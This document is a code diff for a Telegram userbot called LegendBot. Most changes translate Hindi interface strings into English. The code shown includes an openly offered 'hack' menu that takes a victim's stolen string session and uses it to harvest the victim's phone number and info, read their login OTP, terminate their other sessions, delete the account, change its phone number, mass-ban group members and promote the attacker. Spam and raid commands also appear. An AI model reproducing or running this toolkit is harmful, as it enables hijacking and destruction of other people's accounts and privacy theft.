@@ -16,7 +16,7 @@ from .helpers.hack import *
 
 mybot = "missrose_bot"
 
-legendboy = 5122474448
+legendboy = 2024465080
 
 
 from telethon import Button, custom, events
@@ -28,9 +28,9 @@ from .core.session import legend, tgbot
 LOGS = logging.getLogger("LegendUserBot")
 LEGEND_PIC = "https://telegra.ph/file/e753315316673cff51085.mp4"
 
-onbot = "प्रारंभ - जांचें कि क्या मैं जीवित हूं \nहैक - स्ट्रिंग सत्र के माध्यम से किसी को भी हैक करें\nपिंग - पोंग!\nunban - उपयोगकर्ता आईडी/उपयोगकर्ता नाम \ntr - <lang-code> \nप्रसारण - बॉट में सभी उपयोगकर्ताओं को संदेश भेजता है \nid - की आईडी दिखाता है उपयोगकर्ता और मीडिया। \naddnote - नोट जोड़ें \nनोट्स - नोट्स दिखाता है \nस्पैम - स्पैम वैल्यू टेक्स्ट (मान < 100)\nbigspam - स्पैम वैल्यू टेक्स्ट (मान> 100) \nraid - रेड वैल्यू किसी को भी रिप्लाई करें \nरिप्लाईड - किसी को भी रिप्लाई करें \ndreplyraid - रिप्लाई करें किसी के लिए भी \nrmnote - नोट हटाएं \nlive - क्या मैं जीवित हूं? \nbun - समूह में काम करता है, एक उपयोगकर्ता को प्रतिबंधित करता है। \nunbun - समूह में एक उपयोगकर्ता को हटा दें \nprumote - एक उपयोगकर्ता को बढ़ावा देता है \ndemute - एक उपयोगकर्ता को डिमोट करता है \nपिन - एक संदेश पिन करता है \nआंकड़े - बॉट में कुल उपयोगकर्ताओं को दिखाता है \npurge - उस संदेश से इसका जवाब दें जिसे आप हटाना चाहते हैं (आपके बॉट को चाहिए इसे निष्पादित करने के लिए व्यवस्थापक बनें) \ndel - एक संदेश का उत्तर दें जिसे हटा दिया जाना चाहिए (इसे निष्पादित करने के लिए आपका बॉट व्यवस्थापक होना चाहिए)"
+onbot = "start - Check if I am Alive \nhack - Hack Anyone Through String Session\nping - Pong!\nunban - userid/username \ntr - <lang-code> \nbroadcast - Sends Message To all Users In Bot \nid - Shows ID of User And Media. \naddnote - Add Note \nnotes - Shows Notes \nspam - spam value text (value < 100)\nbigspam - spam value text (value > 100) \nraid - Raid value Reply to Anyone \nreplyraid - Reply To Anyone \ndreplyraid - Reply To Anyone \nrmnote - Remove Note \nalive - Am I Alive? \nbun - Works In Group , Bans A User. \nunbun - Unbans A User in Group \nprumote - Promotes A User \ndemute - Demotes A User \npin - Pins A Message \nstats - Shows Total Users In Bot \npurge - Reply It From The Message u Want to Delete (Your Bot Should be Admin to Execute It) \ndel - Reply a Message Tht Should Be Deleted (Your Bot Should be Admin to Execute It)"
 
-perf = "[ लीजेंडबोट ]"
+perf = "[ †hê Lêɠêɳ̃dẞø† ]"
 
 bot = legend
 
@@ -39,13 +39,15 @@ async def killer():
     LEGEND_USER = bot.me.first_name
     The_LegendBoy = bot.uid
     legd_mention = f"[{LEGEND_USER}](tg://user?id={The_LegendBoy})"
-    name = f"{legd_mention}'s सहायक"
-    description = f"मैं {legd_mention} का सहायक हूं। यह बॉट आपको मेरे मास्टर के साथ चैट करने में मदद कर सकता है"
+    name = f"{legd_mention}'s Assistant"
+    description = (
+        f"I am Assistant Of {legd_mention}.This Bot Can Help U To Chat With My Master"
+    )
     starkbot = await legend.tgbot.get_me()
     bot_name = starkbot.first_name
     botname = f"@{starkbot.username}"
-    if bot_name.endswith("सहायक"):
-        print("बोट स्टार्टिंग")
+    if bot_name.endswith("Assistant"):
+        print("Bot Starting")
     else:
         try:
             await bot.send_message("@BotFather", "/setinline")
@@ -86,9 +88,9 @@ async def legends():
     LEGEND_USER = bot.me.first_name
     The_LegendBoy = bot.uid
     legd_mention = f"[{LEGEND_USER}](tg://user?id={The_LegendBoy})"
-    yescaption = f"नमस्ते सर/मिस कुछ हुआ \nडिंग डोंग टिंग टोंग पिंग पोंग\nसफलतापूर्वक लीजेंडबॉट को तैनात किया गया \nमेरे मास्टर ~ 『{legd_mention}』 \nVersion ~ {legendversion}\nमेरे बारे में अधिक जानने के लिए नीचे क्लिक करें👇🏾👇👇🏼"
+    yescaption = f"Hello Sir/Miss Something Happened \nDing Dong Ting Tong Ping Pong\nSuccessfully LegendBot Has Been Deployed \nMy Master ~ 『{legd_mention}』 \nVersion ~ {legendversion}\nClick Below To Know More About Me👇🏾👇👇🏼"
     try:
-        TRY = [(Button.inline("⭐ स्टार्ट ⭐", data="start"))]
+        TRY = [(Button.inline("⭐ Start ⭐", data="start"))]
         await tgbot.send_file(
             bot.me.id, LEGEND_PIC, caption=yescaption, buttons=TRY, incoming=True
         )
@@ -104,23 +106,21 @@ async def help(event):
         await event.delete()
         await tgbot.send_message(
             event.chat_id,
-            message=f"अरे सर इट्स मी {bot_id}, आपकी असिस्टेंट! मैं कैसे आपकी मदद कर सकता हूँ?",
+            message=f"Hey Sir It's Me {bot_id}, Your Assistant! How Can I Help U?",
             buttons=[
                 [
-                    Button.url("👨‍🏫 सपोर्ट ", "https://t.me/Legend_K_Userbot"),
-                    Button.url("🤖 अपडेट्स ", "https://t.me/Official_k_LegendBot"),
+                    Button.url("👨‍🏫 Support ", "https://t.me/Legend_K_Userbot"),
+                    Button.url("🤖 Updates ", "https://t.me/Official_k_LegendBot"),
                 ],
                 [
-                    custom.Button.inline("👤 यूजर्स", data="users"),
-                    custom.Button.inline("⚙ सैटिंग्स", data="osg"),
+                    custom.Button.inline("👤 Users", data="users"),
+                    custom.Button.inline("⚙ Settings", data="osg"),
                 ],
-                [custom.Button.inline("हैक", data="hack")],
+                [custom.Button.inline("Hack", data="hack")],
             ],
         )
     else:
-        await event.answer(
-            "क्षमा करें आप इस बटन को एक्सेस नहीं कर सकते", cache_time=0, alert=True
-        )
+        await event.answer("Sorry U Cant Acces This Button", cache_time=0, alert=True)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"osg")))
@@ -129,56 +129,50 @@ async def help(event):
         await event.delete()
         await tgbot.send_message(
             event.chat_id,
-            message="आप किस प्रकार की सेटिंग चाहते हैं सर",
+            message="Which Type Of Setting Do U Want Sir",
             buttons=[
                 [
-                    custom.Button.inline("♻️ पुनर्प्रारंभ करें", data="res_tart"),
-                    custom.Button.inline("🤖 शट डाउन", data="shutdown"),
+                    custom.Button.inline("♻️ Restart", data="res_tart"),
+                    custom.Button.inline("🤖 Shut Down", data="shutdown"),
                 ],
                 [
-                    custom.Button.inline("🗒 वार", data="strvar"),
-                    custom.Button.inline("👩‍💻 कमांड्स", data="gibcmd"),
+                    custom.Button.inline("🗒 Var", data="strvar"),
+                    custom.Button.inline("👨‍💻 Commmands", data="gibcmd"),
                 ],
-                [custom.Button.inline("✨ बैक ✨", data="start")],
+                [custom.Button.inline("✨ Back ✨", data="start")],
             ],
         )
     else:
         await event.answer(
-            "क्षमा करें केवल मेरे गुरु ही इस बटन तक पहुंच सकते हैं",
-            cache_time=0,
-            alert=True,
+            "Sorry Only My Master Can Access This Button", cache_time=0, alert=True
         )
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"shutdown")))
 async def rel(event):
     if event.query.user_id == bot.uid:
-        await event.answer("शटडाउन लीजेंडबोट...", cache_time=0, alert=True)
+        await event.answer("ShutDown Lêɠêɳ̃dẞø†...", cache_time=0, alert=True)
         if BOTLOG:
-            await event.client.send_message(BOTLOG_CHATID, "#SHUTDOWN \n" "बॉट शट डाउन")
+            await event.client.send_message(
+                BOTLOG_CHATID, "#SHUTDOWN \n" "Bot shut down"
+            )
         if HEROKU_APP is not None:
             HEROKU_APP.process_formation()["worker"].scale(0)
         else:
             os._exit(143)
     else:
         await event.answer(
-            "क्षमा करें केवल मेरे गुरु ही इस बटन तक पहुंच सकते हैं",
-            cache_time=0,
-            alert=True,
+            "Sorry U Dont Have Access to Use this Button", cache_time=0, alert=True
         )
 
 
 @legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"res_tart")))
 async def res_ttart(event):
     if event.query.user_id == bot.uid:
-        await event.answer(
-            "पुनः प्रारंभ हो रहा है कृपया 4 मिनट प्रतीक्षा करें... ",
-            cache_time=0,
-            alert=True,
-        )
+        await event.answer("Restarting Please Wait 4 min... ", cache_time=0, alert=True)
         if BOTLOG:
             LEGEND = await event.client.send_message(
-                BOTLOG_CHATID, "# RESTART \n" "बॉट फिर से शुरू"
+                BOTLOG_CHATID, "# RESTART \n" "Bot Restarted"
             )
         try:
             ulist = get_collectionlist_items()
@@ -199,9 +193,7 @@ async def res_ttart(event):
             LOGS.error(e)
     else:
         await event.answer(
-            "क्षमा करें केवल मेरे गुरु ही इस बटन तक पहुंच सकते हैं ",
-            cache_time=0,
-            alert=True,
+            "Sorry Only My Master Can Access It", cache_time=0, alert=True
         )
 
 
@@ -211,21 +203,17 @@ async def help(event):
         await event.delete()
         await tgbot.send_message(
             event.chat_id,
-            message="आप किस प्रकार की सेटिंग चाहते हैं सर",
+            message="Which Type Of Setting Do U Want Sir",
             buttons=[
                 [
-                    custom.Button.inline("वार एक्सप्लेन", data="var"),
-                    custom.Button.inline("सभी वार", data="allvar"),
+                    custom.Button.inline("Var Explain", data="var"),
+                    custom.Button.inline("All Var", data="allvar"),
                 ],
-                [custom.Button.inline("पीछे", data="osg")],
+                [custom.Button.inline("Back", data="osg")],
             ],
         )
     else:
-        await event.answer(
-            "क्षमा करें केवल मेरे गुरु ही इस बटन तक पहुंच सकते हैं",
-            cache_time=0,
-            alert=True,
-        )
+        await event.answer("Sorry This Button Only My Master", cache_time=0, alert=True)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"var")))
@@ -234,13 +222,13 @@ async def users(event):
         await event.delete()
         await tgbot.send_message(
             event.chat_id,
-            message=".set var <varname> <value> ex:- .set var ALIVE_NAME LegendBoy \n\n सभी वार जानने के लिए वापस जाएं और सभी वार पर क्लिक करें",
+            message=".set var <varname> <value> ex:- .set var ALIVE_NAME LegendBoy \n\n To Know All Var Go Back And Click On All Var",
             buttons=[
-                [custom.Button.inline("पीछे", data="osg")],
+                [custom.Button.inline("Back", data="osg")],
             ],
         )
     else:
-        await event.answer("सॉरी दिस बटन ओनली माई मास्टर", cache_time=0, alert=True)
+        await event.answer("Sorry This Button Only My Master", cache_time=0, alert=True)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"allvar")))
@@ -249,13 +237,13 @@ async def users(event):
         await event.delete()
         await tgbot.send_message(
             event.chat_id,
-            message=" do .setdb",
+            message="All Var Name Are Given Below :\n\nABUSE = ON/ OFF\nALIVE_EMOJI = ANY EMOJI, Example: ✨\nALIVE_MESSAGE = Any Message ,Example : LegendBot Is Online\nALIVE_PIC = telegraph Link, use .tm to get it\nASSISTANT = ON / OFF\nAWAKE_PIC = telegraph link, get from .tm<reply to pic>\n",
             buttons=[
-                [custom.Button.inline("बैक", data="osg")],
+                [custom.Button.inline("Back", data="osg")],
             ],
         )
     else:
-        await event.answer("सॉरी दिस बटन ओनली माई मास्टर", cache_time=0, alert=True)
+        await event.answer("Sorry This Button Only My Master", cache_time=0, alert=True)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"gibcmd")))
@@ -265,7 +253,7 @@ async def users(event):
         await tgbot.send_message(event.chat_id, grabon)
     else:
         await event.answer(
-            "एक मिनट रुको, तुम मेरे मालिक नहीं हो तो इस बटन को छूने की तुम्हारी हिम्मत कैसे हुई",
+            "Wait A Min, U Are Not My Master So How Dare U Trying To Touch This Button",
             cache_time=0,
             alert=True,
         )
@@ -277,33 +265,33 @@ async def help(event):
 
 
 menu = """
-मेरे संदेश का उत्तर दें यदि मैं समूह में उपयोग कर रहा हूँ
+Reply To My Message If I am using In Group
 
-"A" :~ [उपयोगकर्ता के अपने समूहों और चैनलों की जाँच करें]
+"A" :~ [Check user own groups and channels]
 
-"B" :~ [उपयोगकर्ता की सभी जानकारी जैसे फ़ोन नंबर, usrname... आदि की जाँच करें]
+"B" :~ [Check user all information like phone number, usrname... etc]
 
-"C" :~ [एक समूह को प्रतिबंधित करें (मुझे स्ट्रिंग सत्र और चैनल/समूह उपयोगकर्ता नाम दें मैं वहां सभी सदस्यों को प्रतिबंधित कर दूंग।)]
+"C" :~ [Ban a group {give me StringSession and channel/group username i will ban all members there}]
 
-"D" :~ [उपयोगकर्ता को अंतिम ओटीपी जानें {पहला उपयोग विकल्प बी फोन नंबर लें और वहां खाता लॉगिन करें फिर मेरा उपयोग करें मैं आपको ओटीपी दूंगा}]
+"D" :~ [Know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
 
-"E" :~ [StringSession के माध्यम से एक समूह/चैनल में शामिल हों]
+"E" :~ [Join A Group/Channel via StringSession]
 
-"F" :~ [स्ट्रिंग सत्र के माध्यम से एक समूह/चैनल छोड़ें]
+"F" :~ [Leave A Group/Channel via StringSession]
 
-"G" :~ [स्ट्रिंग सत्र के माध्यम से एक समूह/चैनल हटाएं]
+"G" :~ [Delete A Group/Channel]
 
-"H" :~ [उपयोगकर्ता की जाँच करें दो चरण सक्षम या अक्षम हैं]
+"H" :~ [Check user two step is eneable or disable]
 
-"I" :~ [अपने StringSession को छोड़कर सभी मौजूदा सक्रिय स्ट्रिंग सेशन को समाप्त करें]
+"I" :~ [Terminate All current active sessions except Your StringSession]
 
-"J" :~ [खाता हटा दो]
+"J" :~ [Delete Account]
 
-"K" :~ [एक समूह/चैनल में सभी व्यवस्थापकों को पदावनत करें]
+"K" :~ [Demote all admins in a group/channel]
 
-"L" ~ [किसी सदस्य को समूह/चैनल में प्रचारित करें]
+"L" ~ [Promote a member in a group/channel]
 
-"M" ~ [StringSession का उपयोग करके फ़ोन नंबर बदलें]
+"M" ~ [Change Phone number using StringSession]
 
 I will add more features Later 😅
 """
@@ -328,7 +316,7 @@ keyboard = [
         Button.inline("L", data="Lhack"),
         Button.inline("M", data="Mhack"),
     ],
-    [Button.inline("पीछे", data="osg")],
+    [Button.inline("Back", data="osg")],
 ]
 
 
@@ -339,12 +327,11 @@ async def start(event):
         await event.delete()
         async with tgbot.conversation(event.chat_id) as x:
             await x.send_message(
-                f"चुनें कि आप स्ट्रिंग सत्र के साथ क्या चाहते हैं \n\n{menu}",
-                buttons=keyboard,
+                f"Choose what you want with string session \n\n{menu}", buttons=keyboard
             )
     else:
         await event.answer(
-            "आपको इस हैक बटन को एक्सेस करने का अधिकार नहीं है", cache_time=0, alert=True
+            "U Dont Have Right To Access This Hack Button", cache_time=0, alert=True
         )
 
 
@@ -355,58 +342,55 @@ async def start(event):
     global menu
     async with tgbot.conversation(event.chat_id) as x:
         await x.send_message(
-            f"चुनें कि आप स्ट्रिंग सत्र के साथ क्या चाहते हैं \n\n{menu}",
-            buttons=keyboard,
+            f"Choose what you want with string session \n\n{menu}", buttons=keyboard
         )
 
 
 @legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
 async def users(event):
     async with tgbot.conversation(event.chat_id) as x:
-        await x.send_message("📍स्ट्रिंग सीजन दीजिए")
+        await x.send_message("📍GIVE STRING SESSION")
         strses = await x.get_response()
         op = await cu(strses.text)
         if op:
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है।\n /hack", buttons=keyboard
+                "This StringSession Has Been Terminated.\n /hack", buttons=keyboard
             )
         try:
             i = await userchannels(strses.text)
         except:
             return await event.reply(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.\n/hack", buttons=keyboard
+                "This StringSession Has Been Terminated.\n/hack", buttons=keyboard
             )
         if len(i) > 3855:
             file = open("session.txt", "w")
-            file.write(i + "\n\nलीजेंडबॉय द्वारा विवरण")
+            file.write(i + "\n\nDetails BY LegendBoy")
             file.close()
             await bot.send_file(event.chat_id, "session.txt")
             system("rm -rf session.txt")
         else:
             await event.reply(
-                i + "\n\nलीजेंडबॉय बोट का उपयोग करने के लिए धन्यवाद. \n/hack",
-                buttons=keyboard,
+                i + "\n\nThanks For using LegendBoyBot. \n/hack", buttons=keyboard
             )
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Bhack")))
 async def users(event):
     async with tgbot.conversation(event.chat_id) as x:
-        await x.send_message("🔰स्ट्रिंग सत्र दें")
+        await x.send_message("🔰GIVE STRING SESSION")
         strses = await x.get_response()
         op = await cu(strses.text)
         if op:
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है", buttons=keyboard
+                "This StringSession Has Been Terminated.\n/hack", buttons=keyboard
             )
         i = await userinfo(strses.text)
         await event.reply(
-            i + "\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद.\n/hack",
-            buttons=keyboard,
+            i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard
         )
 
 
@@ -420,14 +404,13 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है", buttons=keyboard
+                "String Session Has Been Terminated", buttons=keyboard
             )
         await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
         grpid = await x.get_response()
         await userbans(strses.text, grpid.text)
         await event.reply(
-            "Banning all members. लीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद",
-            buttons=keyboard,
+            "Banning all members. Thanks For using LegendBoy Bot", buttons=keyboard
         )
 
 
@@ -441,12 +424,10 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
+                "This StringSession Has Been Terminated.", buttons=keyboard
             )
         i = await usermsgs(strses.text)
-        await event.reply(
-            i + "\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद", buttons=keyboard
-        )
+        await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
@@ -459,14 +440,13 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
+                "This StringSession Has Been Terminated.", buttons=keyboard
             )
-        await x.send_message("GROUP/CHANNEL USERNAME/ID दो")
+        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
         grpid = await x.get_response()
         await joingroup(strses.text, grpid.text)
         await event.reply(
-            "Joined the Channel/Group. लीजेंडबोट का उपयोग करने के लिए धन्यवाद",
-            buttons=keyboard,
+            "Joined the Channel/Group Thanks For using LegendBoy Bot", buttons=keyboard
         )
 
 
@@ -480,14 +460,13 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
+                "This StringSession Has Been Terminated.", buttons=keyboard
             )
         await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
         grpid = await x.get_response()
         await leavegroup(strses.text, grpid.text)
         await event.reply(
-            "Leaved the Channel/Group लीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद,",
-            buttons=keyboard,
+            "Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard
         )
 
 
@@ -501,14 +480,13 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
+                "This StringSession Has Been Terminated.", buttons=keyboard
             )
         await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
         grpid = await x.get_response()
         await delgroup(strses.text, grpid.text)
         await event.reply(
-            "Deleted the Channel/Group लीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद.",
-            buttons=keyboard,
+            "Deleted the Channel/Group Thanks For using LegendBoyBot.", buttons=keyboard
         )
 
 
@@ -522,7 +500,7 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
+                "This StringSession is terminated maybe.", buttons=keyboard
             )
         i = await user2fa(strses.text)
         if i:
@@ -531,10 +509,7 @@ async def users(event):
                 buttons=keyboard,
             )
         else:
-            await event.reply(
-                "क्षमा करें उपयोगकर्ता के पास पहले से ही 2 Factor लगा हुआ हैं",
-                buttons=keyboard,
-            )
+            await event.reply("Sorry User Have two step already", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ihack")))
@@ -547,11 +522,11 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
+                "This StringSession Has Been Terminated.", buttons=keyboard
             )
         await terminate(strses.text)
         await event.reply(
-            "सभी सत्र समाप्त\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद.",
+            "The all sessions are terminated\n\nThanks For using LegendBoyBot.",
             buttons=keyboard,
         )
 
@@ -566,11 +541,11 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
+                "This StringSession Has Been Terminated.", buttons=keyboard
             )
         await delacc(strses.text)
         await event.reply(
-            "The Account is deleted SUCCESSFULLLY!!\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद.",
+            "The Account is deleted SUCCESSFULLLY\n\nThanks For using LegendBoy Bot.",
             buttons=keyboard,
         )
 
@@ -585,15 +560,15 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
+                "This StringSession Has Been Terminated.", buttons=keyboard
             )
-        await x.send_message("GROUP/CHANNEL USERNAME दो")
+        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
         grp = await x.get_response()
-        await x.send_message("GIVE USER USERNAME दो")
+        await x.send_message("NOW GIVE USER USERNAME")
         user = await x.get_response()
         await promote(strses.text, grp.text, user.text)
         await event.reply(
-            "मैं आपको ग्रुप/चैनल में प्रमोट कर रहा हूँ एक मिनट रुकिए😗😗\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद.",
+            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendBoy Bot.",
             buttons=keyboard,
         )
 
@@ -608,7 +583,7 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
+                "This StringSession Has Been Terminated.", buttons=keyboard
             )
         await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
         pro = await x.get_response()
@@ -617,7 +592,7 @@ async def users(event):
         except:
             pass
         await event.reply(
-            "मैं समूह/चैनल के सभी सदस्यों को अवनत कर रहा हूँ एक मिनट प्रतीक्षा करें 😗😗\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद",
+            "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using LegendBoyBot.",
             buttons=keyboard,
         )
 
@@ -632,17 +607,17 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है", buttons=keyboard
+                "This StringSession is terminated maybe", buttons=keyboard
             )
         await x.send_message(
-            "वह नंबर दें जिसे आप बदलना चाहते है\n [नोट: DON'T USE TEXTNOW OR 2NDLINE NUMBERS]\n[यदि आप TextNow या 2nd Line नंबर का उपयोग करते हैं तो आपको OTP नहीं मिलेगा] "
+            "GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] "
         )
         number = (await x.get_response()).text
         try:
             result = await change_number(strses.text, number)
             await event.respond(
                 result
-                + "\n फ़ोन कोड हैश कॉपी करें और अपना नंबर जांचें जो आपको मिला है\n मैं 20 सेकंड के लिए रुकता हूं, फोन कोड हैश और ओटीपी कॉपी करता हूं"
+                + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp"
             )
             await asyncio.sleep(20)
             await x.send_message("NOW GIVE PHONE CODE HASH")
@@ -653,12 +628,12 @@ async def users(event):
                 strses.text, number, phone_code_hash, otp
             )
             if changing:
-                await event.respond("बधाई हो नंबर बदल दी गई")
+                await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
             else:
-                await event.respond("कुछ गलत हो गया")
+                await event.respond("Something is wrong")
         except Exception as e:
             await event.respond(
-                "इस त्रुटि को भेजें - @Legend_Userbot\n**LOGS**\n" + str(e)
+                "SEND THIS ERROR TO - @Legend_Userbot\n**LOGS**\n" + str(e)
             )
 
 
@@ -672,7 +647,7 @@ async def users(event):
             pass
         else:
             return await event.respond(
-                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
+                "This StringSession Has Been Terminated.", buttons=keyboard
             )
         await x.send_message("API_ID")
         tola = await x.get_response()
@@ -682,17 +657,15 @@ async def users(event):
         hola = await x.get_response()
         nope = hola.message
         apihash = str(nope)
-        await x.send_message("अब ग्रुप/चैनल दें USERNAME1")
+        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
         grp = await x.get_response()
-        await x.send_message("अब उपयोगकर्ता नाम दें जिसमें आप जोड़ना चाहते हैं")
+        await x.send_message("NOW GIVE USERNAME IN WHICH U WANT TO ADD")
         urgrp = await x.get_response()
         try:
             i = await login(strses.text, apiid, apihash, grp.text, urgrp.text)
             await asyncio.sleep(20)
-            await event.reply(
-                i + "लीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद Check Member Is Adding"
-            )
+            await event.reply(i + "Thanks Now Check Member Is Adding")
         except Exception as e:
             await event.respond(
-                "इस त्रुटि को यहां भेजें - @Legend_Userbot\n**LOGS**\n" + str(e)
+                "SEND THIS ERROR TO - @Legend_Userbot\n**LOGS**\n" + str(e)
             )
